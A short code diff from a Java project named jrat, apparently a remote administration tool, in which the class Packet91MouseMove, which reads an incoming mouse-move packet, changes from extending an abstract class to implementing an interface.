@@ -5,7 +5,7 @@ import jrat.client.MouseLock;
 import jrat.client.utils.ScreenUtils;
 import jrat.common.utils.Utils;
 
-public class Packet91MouseMove extends AbstractIncomingPacket {
+public class Packet91MouseMove implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
